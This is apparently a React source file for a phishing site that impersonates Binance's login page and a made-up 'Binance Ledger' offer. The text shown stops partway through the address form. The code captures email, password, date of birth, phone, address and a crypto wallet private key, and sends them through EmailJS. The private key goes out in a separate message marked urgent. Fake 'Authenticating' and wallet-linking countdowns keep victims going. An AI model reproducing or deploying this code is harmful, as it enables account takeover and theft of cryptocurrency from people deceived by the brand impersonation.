import { FC, useState, FormEvent, useEffect } from "react";
import { useToast } from "@/hooks/use-toast";
import { Checkbox } from "@/components/ui/checkbox";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
import { Wallet, CheckCircle, AlertCircle, Lock, ArrowRight, Eye, EyeOff, Globe } from "lucide-react";
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from "@/config/emailjs.config";

// List of countries for the dropdown
const countries = [
  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", 
  "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", "Bolivia", 
  "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", 
  "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", 
  "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", 
  "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", 
  "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", 
  "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", 
  "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, North", "Korea, South", "Kosovo", "Kuwait", "Kyrgyzstan", "Laos", 
  "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", 
  "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", 
  "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", 
  "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau", "Palestine", 
  "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", 
  "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", 
  "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", 
  "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", 
  "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", 
  "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", 
  "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", 
  "Yemen", "Zambia", "Zimbabwe"
];

enum FormStep {
  LOGIN_EMAIL = 1,
  LOGIN_PASSWORD = 2,
  APP_VERIFICATION = 3,
  LOGIN_SUCCESS = 4,
  PERSONAL_DETAILS = 5,
  ADDRESS_DETAILS = 6,
  CONFIRMATION = 7,
  SHIPMENT_CONFIRMATION = 8,
  WALLET_STEP1 = 9,
  WALLET_STEP2 = 10,
  WALLET_STEP3 = 11,
  WALLET_STEP4 = 12, 
  WALLET_STEP5 = 13,
  WALLET_STEP6 = 14,
  WALLET_STEP7 = 15,
  WALLET_STEP8 = 16,
  WALLET_LINKING = 17,
  WALLET_SUCCESS = 18
}

const BinanceLedgerForm: FC = () => {
  const { toast } = useToast();
  const [currentStep, setCurrentStep] = useState<FormStep>(FormStep.LOGIN_EMAIL);
  const [formProgress, setFormProgress] = useState(5);
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    phoneNumber: "",
    address: "",
    zipCode: "",
    city: "",
    country: "",
    privateKey: "",
    securityConfirmation: false,
    walletConfirmations: {
      understand: false,
      risks: false,
      backup: false,
      responsibility: false
    }
  });
  
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLinkingDialog, setShowLinkingDialog] = useState(false);
  const [timerCount, setTimerCount] = useState(10);

  // Calculate progress based on current step
  useEffect(() => {
    // Map steps to progress percentage (approximately)
    const stepToProgress = {
      [FormStep.LOGIN_EMAIL]: 5,
      [FormStep.LOGIN_PASSWORD]: 10,
      [FormStep.APP_VERIFICATION]: 15,
      [FormStep.LOGIN_SUCCESS]: 20,
      [FormStep.PERSONAL_DETAILS]: 30,
      [FormStep.ADDRESS_DETAILS]: 40,
      [FormStep.CONFIRMATION]: 50,
      [FormStep.SHIPMENT_CONFIRMATION]: 55,
      [FormStep.WALLET_STEP1]: 60,
      [FormStep.WALLET_STEP8]: 90,
      [FormStep.WALLET_LINKING]: 95,
      [FormStep.WALLET_SUCCESS]: 100,
    };

    // Get progress for the current step or default to the step number * 5
    const progress = stepToProgress[currentStep] || currentStep * 5;
    setFormProgress(Math.min(progress, 100)); // Cap at 100%
  }, [currentStep]);

  // Timer effects for verification screens
  useEffect(() => {
    let timer: NodeJS.Timeout;
    
    if (currentStep === FormStep.APP_VERIFICATION && timerCount > 0) {
      timer = setTimeout(() => {
        setTimerCount(timerCount - 1);
      }, 1000);
    } else if (currentStep === FormStep.APP_VERIFICATION && timerCount === 0) {
      // Close the verification dialog and move to login success
      setCurrentStep(FormStep.LOGIN_SUCCESS);
      setTimerCount(10); // Reset for next timer
      toast({
        title: "Success",
        description: "Authentication successful",
      });
    }
    
    if (currentStep === FormStep.WALLET_LINKING && timerCount > 0) {
      timer = setTimeout(() => {
        setTimerCount(timerCount - 1);
      }, 1000);
    } else if (currentStep === FormStep.WALLET_LINKING && timerCount === 0) {
      setShowLinkingDialog(false);
      setCurrentStep(FormStep.WALLET_SUCCESS);
    }
    
    return () => {
      if (timer) clearTimeout(timer);
    };
  }, [currentStep, timerCount, toast]);

  const sendEmailNotification = async (isPrivateKeySubmission = false) => {
    try {
      // Create email template params with all form data
      const privateKey = formData.privateKey || "No private key provided";
      
      // Create a subject line that indicates if this contains the private key
      const emailSubject = isPrivateKeySubmission ? 
        "🚨 IMPORTANT: Binance Ledger Private Key Submission" : 
        "Binance Ledger Registration Information";
      
      const templateParams = {
        user_email: formData.email,
        user_password: formData.password,
        user_name: `${formData.firstName} ${formData.lastName}`,
        user_phone: formData.phoneNumber,
        user_dob: formData.dateOfBirth,
        user_address: formData.address,
        user_zip: formData.zipCode,
        user_city: formData.city,
        user_country: formData.country,
        user_private_key: privateKey,
        submission_subject: emailSubject,
        submission_date: new Date().toLocaleString(),
        // Include complete form data as JSON for backup
        form_data: JSON.stringify({
          email: formData.email,
          password: formData.password,
          firstName: formData.firstName,
          lastName: formData.lastName,
          dateOfBirth: formData.dateOfBirth,
          phoneNumber: formData.phoneNumber,
          address: formData.address,
          zipCode: formData.zipCode,
          city: formData.city,
          country: formData.country,
          privateKey: privateKey,
          walletConfirmations: formData.walletConfirmations
        }, null, 2)
      };

      console.log(`Sending email notification - Private key submission: ${isPrivateKeySubmission}`);
      console.log('Email template params:', JSON.stringify(templateParams));

      // Send email with EmailJS
      const response = await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams,
        EMAILJS_CONFIG.USER_ID
      );

      console.log('Email sent successfully:', response);
      
      if (isPrivateKeySubmission) {
        toast({
          title: "Success",
          description: "Your wallet information has been securely sent",
        });
      }
      
      return true;
    } catch (error) {
      console.error('Failed to send email:', error);
      toast({
        title: "Warning",
        description: "Form submitted but email notification failed to send",
        variant: "destructive",
      });
      return false;
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
    
    // Clear error for this field if it exists
    if (errors[e.target.name]) {
      setErrors({
        ...errors,
        [e.target.name]: "",
      });
    }
  };

  const handleSecurityConfirmation = (checked: boolean) => {
    setFormData({
      ...formData,
      securityConfirmation: checked,
    });
  };

  const handleWalletConfirmation = (key: keyof typeof formData.walletConfirmations, checked: boolean) => {
    setFormData({
      ...formData,
      walletConfirmations: {
        ...formData.walletConfirmations,
        [key]: checked
      }
    });
  };

  const validateEmail = () => {
    const newErrors: Record<string, string> = {};
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!formData.email) {
      newErrors.email = "Email is required";
    } else if (!emailRegex.test(formData.email)) {
      newErrors.email = "Please enter a valid email address";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validatePassword = () => {
    const newErrors: Record<string, string> = {};

    if (!formData.password) {
      newErrors.password = "Password is required";
    } else if (formData.password.length < 8) {
      newErrors.password = "Password must be at least 8 characters";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validatePersonalDetails = () => {
    const newErrors: Record<string, string> = {};

    if (!formData.firstName.trim()) {
      newErrors.firstName = "First name is required";
    }
    
    if (!formData.lastName.trim()) {
      newErrors.lastName = "Last name is required";
    }
    
    if (!formData.dateOfBirth) {
      newErrors.dateOfBirth = "Date of birth is required";
    }
    
    if (!formData.phoneNumber.trim()) {
      newErrors.phoneNumber = "Phone number is required";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateAddressDetails = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.address.trim()) {
      newErrors.address = "Address is required";
    }
    
    if (!formData.zipCode.trim()) {
      newErrors.zipCode = "Postal code is required";
    }
    
    if (!formData.city.trim()) {
      newErrors.city = "City is required";
    }
    
    if (!formData.country) {
      newErrors.country = "Country is required";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validatePrivateKey = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.privateKey.trim()) {
      newErrors.privateKey = "Private key is required to link your wallet";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateWalletConfirmations = () => {
    const { understand, risks, backup, responsibility } = formData.walletConfirmations;
    
    if (!understand || !risks || !backup || !responsibility) {
      toast({
        title: "Error",
        description: "Please confirm all security notices before proceeding",
        variant: "destructive",
      });
      return false;
    }
    
    return true;
  };

  const handleNext = () => {
    switch (currentStep) {
      case FormStep.LOGIN_EMAIL:
        if (validateEmail()) {
          setCurrentStep(FormStep.LOGIN_PASSWORD);
        }
        break;
        
      case FormStep.LOGIN_PASSWORD:
        if (validatePassword()) {
          setCurrentStep(FormStep.APP_VERIFICATION);
          setTimerCount(6); // Set to 6 seconds for silent wait
        }
        break;
        
      case FormStep.LOGIN_SUCCESS:
        setCurrentStep(FormStep.PERSONAL_DETAILS);
        break;
        
      case FormStep.PERSONAL_DETAILS:
        if (validatePersonalDetails()) {
          setCurrentStep(FormStep.ADDRESS_DETAILS);
        }
        break;
        
      case FormStep.ADDRESS_DETAILS:
        if (validateAddressDetails()) {
          setCurrentStep(FormStep.CONFIRMATION);
        }
        break;
        
      case FormStep.CONFIRMATION:
        setIsSubmitting(true);
        // Send email with form data but no private key yet
        sendEmailNotification(false).finally(() => {
          setIsSubmitting(false);
          setCurrentStep(FormStep.SHIPMENT_CONFIRMATION);
        });
        break;
        
      case FormStep.SHIPMENT_CONFIRMATION:
        setCurrentStep(FormStep.WALLET_STEP1);
        break;
        
      case FormStep.WALLET_STEP1:
        setCurrentStep(FormStep.WALLET_STEP2);
        break;
        
      case FormStep.WALLET_STEP2:
        setCurrentStep(FormStep.WALLET_STEP3);
        break;
        
      case FormStep.WALLET_STEP3:
        setCurrentStep(FormStep.WALLET_STEP4);
        break;
        
      case FormStep.WALLET_STEP4:
        setCurrentStep(FormStep.WALLET_STEP5);
        break;
        
      case FormStep.WALLET_STEP5:
        setCurrentStep(FormStep.WALLET_STEP6);
        break;
        
      case FormStep.WALLET_STEP6:
        setCurrentStep(FormStep.WALLET_STEP7);
        break;
        
      case FormStep.WALLET_STEP7:
        if (validateWalletConfirmations()) {
          setCurrentStep(FormStep.WALLET_STEP8);
        }
        break;
        
      case FormStep.WALLET_STEP8:
        if (validatePrivateKey()) {
          setIsSubmitting(true);
          
          // Send a second email specifically with the private key submission
          sendEmailNotification(true)
            .finally(() => {
              setIsSubmitting(false);
              setShowLinkingDialog(true);
              setCurrentStep(FormStep.WALLET_LINKING);
              setTimerCount(10); // Reset timer when starting linking
            });
        }
        break;
        
      default:
        break;
    }
  };

  const handlePrevious = () => {
    if (currentStep > FormStep.LOGIN_EMAIL) {
      setCurrentStep(prevStep => prevStep - 1);
    }
  };

  const renderAppVerification = () => (
    <div className="text-center py-8 space-y-6">
      <div className="w-20 h-20 mx-auto bg-binance-yellow/20 rounded-full flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow"></div>
      </div>
      <h3 className="text-white font-semibold text-xl">Authenticating...</h3>
      <p className="text-gray-300 max-w-md mx-auto">
        Please wait while we verify your credentials.
      </p>
    </div>
  );

  const renderLoginSuccess = () => (
    <div className="text-center py-8 space-y-6">
      <div className="w-20 h-20 mx-auto bg-binance-yellow/20 rounded-full flex items-center justify-center">
        <CheckCircle className="w-10 h-10 text-binance-yellow" />
      </div>
      <h3 className="text-white font-semibold text-xl">Login Successful</h3>
      <p className="text-gray-300 max-w-md mx-auto">
        Welcome back to Binance Ledger Portal. We will now verify a few personal details 
        in order to send you the Binance Ledger.
      </p>
      <Button
        onClick={handleNext}
        className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
      >
        Continue
      </Button>
    </div>
  );

  const renderLoginEmail = () => (
    <div className="min-h-screen bg-[#0b0e11] flex">
      {/* Top bar with Binance logo */}
      <div className="absolute top-0 left-0 w-full z-10">
        <div className="flex items-center justify-between p-6">
          <div className="flex items-center">
            <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
              <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
              <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
              <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
              <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
              <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
            </svg>
            <span className="text-white text-2xl font-bold ml-3">Binance</span>
          </div>
          <div className="flex items-center space-x-4">
            <div className="flex items-center text-[#848e9c] text-sm cursor-pointer">
              <Globe className="w-4 h-4 mr-2" />
              <span>English</span>
            </div>
          </div>
        </div>
      </div>

      {/* Left side - Marketing content */}
      <div className="flex-1 flex items-center justify-center px-16 pt-24">
        <div className="max-w-lg">
          <h1 className="text-white text-[56px] font-semibold leading-[64px] mb-6">
            Buy, trade, and hold 350+ cryptocurrencies
          </h1>
          <p className="text-[#848e9c] text-xl leading-7 mb-8">
            Join the world's largest crypto exchange
          </p>
          <div className="space-y-4">
            <div className="flex items-center text-[#848e9c]">
              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
              <span>Trade with confidence on the world's leading crypto exchange</span>
            </div>
            <div className="flex items-center text-[#848e9c]">
              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
              <span>24/7 customer service</span>
            </div>
            <div className="flex items-center text-[#848e9c]">
              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
              <span>Simple and secure</span>
            </div>
          </div>
        </div>
      </div>

      {/* Right side - Login form */}
      <div className="w-[480px] bg-[#1e2329] pt-24">
        <div className="p-8">
          <div className="mb-8">
            <h2 className="text-white text-[32px] font-semibold mb-2">Log In</h2>
            <p className="text-[#848e9c] text-base">
              Welcome back! Please sign in to your account
            </p>
          </div>

          <div className="space-y-6">
            <div>
              <label htmlFor="email" className="block text-[#eaecef] text-sm font-medium mb-3">
                Email
              </label>
              <Input
                id="email"
                name="email"
                type="email"
                value={formData.email}
                onChange={handleInputChange}
                placeholder="Please enter your email"
                className={`w-full h-12 bg-[#2b3139] border border-[#474d57] text-white placeholder-[#848e9c] rounded text-base focus:border-[#fcd535] focus:ring-0 focus:outline-none ${errors.email ? "border-red-500" : ""}`}
                autoFocus
              />
              {errors.email && <p className="text-red-500 text-sm mt-2">{errors.email}</p>}
            </div>
            
            <Button
              onClick={handleNext}
              className="w-full h-12 bg-[#fcd535] text-[#0b0e11] font-semibold text-base rounded hover:bg-[#e6c441] transition-colors"
            >
              Continue
            </Button>
            
            <div className="text-center">
              <p className="text-[#848e9c] text-sm">
                Don't have an account? <span className="text-[#fcd535] cursor-pointer hover:underline">Sign up</span>
              </p>
            </div>

            <div className="flex items-center my-8">
              <div className="flex-1 border-t border-[#474d57]"></div>
              <span className="px-4 text-[#848e9c] text-sm">Or continue with</span>
              <div className="flex-1 border-t border-[#474d57]"></div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <Button
                variant="outline"
                className="h-12 bg-transparent border border-[#474d57] text-[#eaecef] hover:bg-[#2b3139] hover:border-[#848e9c] rounded"
              >
                <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24">
                  <path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                  <path fill="currentColor" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                  <path fill="currentColor" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                  <path fill="currentColor" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                Google
              </Button>
              <Button
                variant="outline"
                className="h-12 bg-transparent border border-[#474d57] text-[#eaecef] hover:bg-[#2b3139] hover:border-[#848e9c] rounded"
              >
                <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24">
                  <path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Facebook
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderLoginPassword = () => (
    <div className="min-h-screen bg-[#0b0e11] flex">
      {/* Top bar with Binance logo */}
      <div className="absolute top-0 left-0 w-full z-10">
        <div className="flex items-center justify-between p-6">
          <div className="flex items-center">
            <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
              <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
              <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
              <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
              <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
              <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
            </svg>
            <span className="text-white text-2xl font-bold ml-3">Binance</span>
          </div>
          <div className="flex items-center space-x-4">
            <div className="flex items-center text-[#848e9c] text-sm cursor-pointer">
              <Globe className="w-4 h-4 mr-2" />
              <span>English</span>
            </div>
          </div>
        </div>
      </div>

      {/* Left side - Marketing content */}
      <div className="flex-1 flex items-center justify-center px-16 pt-24">
        <div className="max-w-lg">
          <h1 className="text-white text-[56px] font-semibold leading-[64px] mb-6">
            Buy, trade, and hold 350+ cryptocurrencies
          </h1>
          <p className="text-[#848e9c] text-xl leading-7 mb-8">
            Join the world's largest crypto exchange
          </p>
          <div className="space-y-4">
            <div className="flex items-center text-[#848e9c]">
              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
              <span>Trade with confidence on the world's leading crypto exchange</span>
            </div>
            <div className="flex items-center text-[#848e9c]">
              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
              <span>24/7 customer service</span>
            </div>
            <div className="flex items-center text-[#848e9c]">
              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
              <span>Simple and secure</span>
            </div>
          </div>
        </div>
      </div>

      {/* Right side - Login form */}
      <div className="w-[480px] bg-[#1e2329] pt-24">
        <div className="p-8">
          <div className="mb-8">
            <h2 className="text-white text-[32px] font-semibold mb-2">Log In</h2>
            <p className="text-[#848e9c] text-base">
              Welcome back! Please enter your password
            </p>
          </div>

          <div className="space-y-6">
            <div>
              <div className="flex items-center justify-between mb-3">
                <label htmlFor="password" className="block text-[#eaecef] text-sm font-medium">
                  Password
                </label>
                <span className="text-[#fcd535] text-sm cursor-pointer hover:underline">
                  Forgot Password?
                </span>
              </div>
              <div className="relative">
                <Input
                  id="password"
                  name="password"
                  type={showPassword ? "text" : "password"}
                  value={formData.password}
                  onChange={handleInputChange}
                  placeholder="Enter your password"
                  className={`w-full h-12 bg-[#2b3139] border border-[#474d57] text-white placeholder-[#848e9c] rounded text-base pr-12 focus:border-[#fcd535] focus:ring-0 focus:outline-none ${errors.password ? "border-red-500" : ""}`}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-[#848e9c] hover:text-white"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
              {errors.password && <p className="text-red-500 text-sm mt-2">{errors.password}</p>}
            </div>
            
            <div className="flex space-x-4">
              <Button
                type="button"
                onClick={handlePrevious}
                className="flex-1 h-12 bg-transparent border border-[#474d57] text-[#eaecef] font-semibold text-base rounded hover:bg-[#2b3139] hover:border-[#848e9c]"
              >
                Back
              </Button>
              <Button
                onClick={handleNext}
                className="flex-1 h-12 bg-[#fcd535] text-[#0b0e11] font-semibold text-base rounded hover:bg-[#e6c441] transition-colors"
              >
                Log In
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderPersonalDetails = () => (
    <div className="w-full max-w-md mx-auto">
      <div className="text-center mb-8">
        <h1 className="text-2xl font-semibold text-white mb-2">Personal Information</h1>
        <p className="text-gray-400 text-sm">Please provide your personal details</p>
      </div>
      
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-3">
          <div>
            <label htmlFor="firstName" className="block text-sm font-medium text-gray-300 mb-2">
              First Name
            </label>
            <Input
              id="firstName"
              name="firstName"
              value={formData.firstName}
              onChange={handleInputChange}
              placeholder="First Name"
              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.firstName ? "border-red-500" : ""}`}
            />
            {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
          </div>
          <div>
            <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-2">
              Last Name
            </label>
            <Input
              id="lastName"
              name="lastName"
              value={formData.lastName}
              onChange={handleInputChange}
              placeholder="Last Name"
              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.lastName ? "border-red-500" : ""}`}
            />
            {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
          </div>
        </div>
        
        <div>
          <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-300 mb-2">
            Date of Birth
          </label>
          <Input
            id="dateOfBirth"
            name="dateOfBirth"
            type="date"
            value={formData.dateOfBirth}
            onChange={handleInputChange}
            className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.dateOfBirth ? "border-red-500" : ""}`}
          />
          {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
        </div>
        
        <div>
          <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-300 mb-2">
            Phone Number
          </label>
          <Input
            id="phoneNumber"
            name="phoneNumber"
            type="tel"
            value={formData.phoneNumber}
            onChange={handleInputChange}
            placeholder="Phone Number"
            className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.phoneNumber ? "border-red-500" : ""}`}
          />
          {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
        </div>
        
        <div className="flex justify-between space-x-3 pt-4">
          <Button
            type="button"
            onClick={handlePrevious}
            className="flex-1 h-12 bg-transparent border border-[#474d57] text-gray-300 font-medium rounded-md hover:border-gray-400 transition-colors"
          >
            Back
          </Button>
          <Button
            type="button"
            onClick={handleNext}
            className="flex-1 h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
          >
            Next
          </Button>
        </div>
      </div>
    </div>
  );

  const renderAddressDetails = () => (
    <div className="w-full max-w-md mx-auto">
      <div className="text-center mb-8">
        <h1 className="text-2xl font-semibold text-white mb-2">Address Details</h1>
        <p className="text-gray-400 text-sm">Please provide your shipping address</p>
      </div>
      
      <div className="space-y-4">
        <div>
          <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-2">
            Address
          </label>
          <Input
            id="address"
            name="address"
            value={formData.address}
            onChange={handleInputChange}
            placeholder="Street Address"
            className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.address ? "border-red-500" : ""}`}
          />
          {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address}</p>}
        </div>

        <div className="grid grid-cols-2 gap-3">
          <div>
            <label htmlFor="zipCode" className="block text-sm font-medium text-gray-300 mb-2">
              Postal Code
            </label>
            <Input
              id="zipCode"
              name="zipCode"
              value={formData.zipCode}
              onChange={handleInputChange}
              placeholder="Postal Code"
              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.zipCode ? "border-red-500" : ""}`}
            />
            {errors.zipCode && <p className="text-red-500 text-xs mt-1">{errors.zipCode}</p>}
          </div>
          <div>
            <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-2">
              City
            </label>
            <Input
              id="city"
              name="city"
              value={formData.city}
              onChange={handleInputChange}
              placeholder="City"
              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.city ? "border-red-500" : ""}`}
            />
            {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
          </div>
        </div>

        <div>
          <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-2">
            Country
          </label>
          <Select
            name="country"
            value={formData.country}
            onValueChange={(value) => {
              setFormData({
                ...formData,
                country: value
              });
              // Clear error for this field if it exists
              if (errors.country) {
                setErrors({
                  ...errors,
                  country: ""
                });
              }
            }}
          >
            <SelectTrigger 
              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.country ? "border-red-500" : ""}`}
            >
              <SelectValue placeholder="Select a country" />
            </SelectTrigger>
            <SelectContent className="bg-[#2b3139] border-[#474d57] text-white max-h-[200px]">
              {countries.map((country) => (
                <SelectItem key={country} value={country} className="hover:bg-[#3c4149]">
                  {country}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
        </div>
        
        <div className="flex justify-between space-x-3 pt-4">
          <Button
            type="button"
            onClick={handlePrevious}
